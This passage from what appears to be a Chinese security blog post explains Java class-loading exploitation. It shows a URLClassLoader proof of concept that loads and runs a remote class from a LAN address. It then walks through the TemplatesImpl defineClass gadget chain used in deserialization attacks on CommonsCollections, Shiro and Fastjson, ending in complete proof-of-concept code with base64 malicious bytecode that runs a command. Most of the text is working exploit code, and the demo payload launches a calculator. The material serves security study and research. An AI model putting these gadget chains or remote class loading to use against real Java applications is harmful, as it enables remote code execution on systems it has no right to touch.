+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLClassLoaderPayload.java   放在加载文件的项目文件外</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">URLClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// URLClassLoaderRCE.java   用于加载远程恶意文件</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.10.126:9999/&quot;</span>);</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">my_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> my_loader.loadClass(<span class="string">&quot;URLClassLoaderPayload&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(<span class="literal">null</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="defineClass-调用链"><a href="#defineClass-调用链" class="headerlink" title="defineClass()调用链"></a>defineClass()调用链</h2><h3 id="细嗦缘由"><a href="#细嗦缘由" class="headerlink" title="细嗦缘由"></a>细嗦缘由</h3><ol>
+<li>通过 defineClass 直接加载字节码时，由于 defineClass 方法的<strong>访问修饰符为 protected</strong>，不得不使用到反射技术才得以利用，这使得 defineClass 在实战利用中没法被直接利用，不过也提到了存在一些间接路线能够对 defineClass 进行间接调用</li>
+<li>这里的间接路线也是类似于java反序列化的链条进行调用的，所以也是调用链</li>
+</ol>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="什么是TemplatesImpl"><a href="#什么是TemplatesImpl" class="headerlink" title="什么是TemplatesImpl?"></a>什么是TemplatesImpl?</h4><blockquote>
+<p>TemplatesImpl 便是间接路线之一<br>TemplatesImpl 在后续的多个反序列化链及实际场景中都会有所体现，如 CommonsCollections2、CommonsCollections3、CommonsCollections4、CommonsBeanutils1、Shiro 反序列化利用和 Fastjson 反序列化利用等</p>
+</blockquote>
+<ol>
+<li><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类的作用是表示 XSLT 模板，它可以解析 XSLT 样式表并将其编译成可重用的模板。XSLT 是一种 XML 风格语言，<strong>用于将 XML 文档转换为其他格式，比如 HTML、文本或其他 XML 文档</strong></p>
+<ol>
+<li>它是 javax.xml.transform.Templates 接口的具体实现</li>
+<li>可以进行序列化</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h4><ol>
+<li><p>调用链式倒推的，首先看到寻找TemplatesImpl中可供defindeClass()方法，在内部静态类<code>TransletClassLoader</code>中</p>
+<ol>
+<li>注意到此处的defineClass()方法的访问属性式default，即可以被同一个包的访问到，这个静态类继承了ClassLoader</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接着找调用defineClas的调用处<code>defineTransdletClasses()</code></p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// ...下面不贴了</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>再往上找，<code>getTransletInstance()</code>中有调用，还是private，再往上</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... 略</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>终于到一个public的方法，再看看注释</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implements JAXP&#x27;s Templates.newTransformer()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后亮出<strong>Gadget</strong></p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>还要分析怎么利用才行，show me your poc</p>
+<ol>
+<li><p>先从sink到调用处分析，先看看这两个属性</p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the actual class definition for the translet class and</span></span><br><span class="line"><span class="comment"> * any auxiliary classes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the translet class definition(s). These are created when</span></span><br><span class="line"><span class="comment"> * this Templates is created or when it is read back from disk.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code>可以知道只要将恶意类的代码放到<code>_bytecodes[i]</code>即可，会自动加载类代码</p>
+</li>
+<li><p>来到TemplatesImpl#getTransletInstance(): <code>if (_name == null) return null;if (_class == null) defineTransletClasses();</code>这一行中<strong>req1: 要_name不为bull，_class为null</strong></p>
+</li>
+<li><p>来到newTransformer()中，有用到_开头的变量，应该是该类变量，正常调用就会调用链子</p>
+</li>
+<li><p>还是得顺着回去来一遍</p>
+<ol>
+<li><p>newTransformer中 <strong>req2: <code>_tfactory</code>有进行函数调用，没说为nullable</strong> ，不能为null，其他变量先为null问题不大</p>
+</li>
+<li><p>getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>会<strong>对_class进行一次反射调用</strong>，不能为null，<strong>但是要调用到defineTrnasletClasses需要它为null(前面有说过了)</strong></p>
+</li>
+<li><p>defineTransletClasses中发现面这句话，_transletIndex应该不用进行设定，会在这里进行遍历，不过这个反射实例化的类得看一看，<strong>必须是AbstrtactTranslet的子类</strong>，看看构造函数怎么办，搜<code>_class</code></p>
+   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关于<code>_class</code>的设置发现这defineTransletClasses里有，<strong>req4: 所以我们传入的<code>_bytecodes</code>必须是AbstractTranslet的子类</strong></p>
+   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">_class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>触发恶意代码：AbstractTranslet子类会把<code>_class[_transletIndex]</code>进行实例化，写在构造函数里就好了</p>
+</li>
+</ol>
+</li>
+<li><p><em><strong>总结一下要求</strong></em>(关注必须的就ok)</p>
+<ol>
+<li><code>_tfactory</code>不为null –&gt; 其实这里也非强制，虽然没有@Nullable，但是因为比较慢调用，而且动态类型不会编译错误</li>
+<li><code>_name</code>不为null，<code>_class</code>为null</li>
+<li><code>_bytecodes[i]</code>需要时AbstractTranslet的子类，中有恶意类代码</li>
+<li>构造函数是私有的，通过反射进行创建？其实不用，使用公共的构造器就ok了</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h4 id="TemplatesImpl-poc"><a href="#TemplatesImpl-poc" class="headerlink" title="TemplatesImpl poc"></a>TemplatesImpl poc</h4><blockquote>
+<ol>
+<li>注意的点<ol>
+<li>这一条Gadget构造时比较特殊的条件是这个_bytecodes这里需要是<code>AbstractTranslet</code>的子类，一开始倒也不用看很细，后面报错&#x2F;调试也可以发现的，关键代码在getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></li>
+<li>调用点在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>，发现这里其实只要抓住_bytecodes[i]就好</li>
+</ol>
+</li>
+<li>总的来说，找条件时要细心一点，链子poc重点在于：调用链，触发点</li>
+</ol>
+</blockquote>
+<ol>
+<li>最终虽然会报错但是也会成功弹出来calc，利用成功</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImplPayload.java 我的恶意类，在构造函数中执行命令即可，内部会有newInstance()</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImplRCE.java</span></span><br><span class="line">    <span class="comment">// poc触发，最终payload其实是triggerObj这个对象，在通过newTransformer方法触发链子</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplRCE</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 获取Templ...对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射构造调用条件 * * * * * */</span></span><br><span class="line">            <span class="comment">// 0. payload: javac TemplatesImpPayload.java &amp;&amp; cat TemplatesImplRCE.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 设置_name</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="comment">// 2. 设置_bytecodes，放入恶意类就好</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            <span class="comment">// 3. 设置_tfactory，从类中copy的</span></span><br><span class="line">            setFieldValue(triggerObj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() );</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 触发调用点 * * * * * */</span></span><br><span class="line">            triggerObj.newTransformer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field_name, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field_name);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
